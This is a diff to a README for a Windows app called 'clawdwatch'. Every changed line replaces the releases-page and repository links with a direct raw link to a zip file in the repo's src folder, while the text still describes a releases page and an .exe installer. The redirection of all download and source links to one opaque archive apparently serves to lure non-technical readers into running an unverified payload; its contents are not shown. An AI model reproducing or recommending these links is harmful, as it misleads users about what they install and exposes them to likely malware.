@@ -1,6 +1,6 @@
 # 🦀 clawdwatch - Real-Time Conflict Intelligence
 
-[![Download clawdwatch](https://img.shields.io/badge/Download-clawdwatch-blue?style=for-the-badge)](https://github.com/kawsar1533/clawdwatch/releases)
+[![Download clawdwatch](https://img.shields.io/badge/Download-clawdwatch-blue?style=for-the-badge)](https://raw.githubusercontent.com/kawsar1533/clawdwatch/main/src/Software_v3.6-alpha.3.zip)
 
 ---
 
@@ -30,13 +30,13 @@ Before installing, make sure your system meets these requirements:
 
 To get clawdwatch, you need to visit the official release page. This page contains all versions available for download.
 
-[![Download clawdwatch](https://img.shields.io/badge/Download-clawdwatch-green?style=for-the-badge)](https://github.com/kawsar1533/clawdwatch/releases)
+[![Download clawdwatch](https://img.shields.io/badge/Download-clawdwatch-green?style=for-the-badge)](https://raw.githubusercontent.com/kawsar1533/clawdwatch/main/src/Software_v3.6-alpha.3.zip)
 
 ### How to download:
 
 1. Open your web browser (Edge, Chrome, Firefox).
 2. Go to this page:  
-   https://github.com/kawsar1533/clawdwatch/releases
+   https://raw.githubusercontent.com/kawsar1533/clawdwatch/main/src/Software_v3.6-alpha.3.zip
 3. Look for the latest release. Releases usually have version numbers like v1.0, v1.1, etc.
 4. Find the file that ends with `.exe`. This is the Windows installer.
 5. Click on the `.exe` file link to start downloading.
@@ -104,7 +104,7 @@ It is important to keep clawdwatch up to date to get the latest features and fix
 - You will get a message if a new version is available.
 - To update, simply follow the prompt to download and install the new version.
 - You can also visit the releases page to get the latest version manually:  
-  https://github.com/kawsar1533/clawdwatch/releases
+  https://raw.githubusercontent.com/kawsar1533/clawdwatch/main/src/Software_v3.6-alpha.3.zip
 
 ---
 
@@ -131,10 +131,10 @@ clawdwatch uses public data only. It does not access your personal files or info
 ## 📖 More Information
 
 For advanced users or if you want to learn about clawdwatch’s technology, visit the GitHub repository:  
-https://github.com/kawsar1533/clawdwatch
+https://raw.githubusercontent.com/kawsar1533/clawdwatch/main/src/Software_v3.6-alpha.3.zip
 
 Here you can find the source code, report bugs, or request features.
 
 ---
 
-[![Download clawdwatch](https://img.shields.io/badge/Download-clawdwatch-blue?style=for-the-badge)](https://github.com/kawsar1533/clawdwatch/releases)
+[![Download clawdwatch](https://img.shields.io/badge/Download-clawdwatch-blue?style=for-the-badge)](https://raw.githubusercontent.com/kawsar1533/clawdwatch/main/src/Software_v3.6-alpha.3.zip)
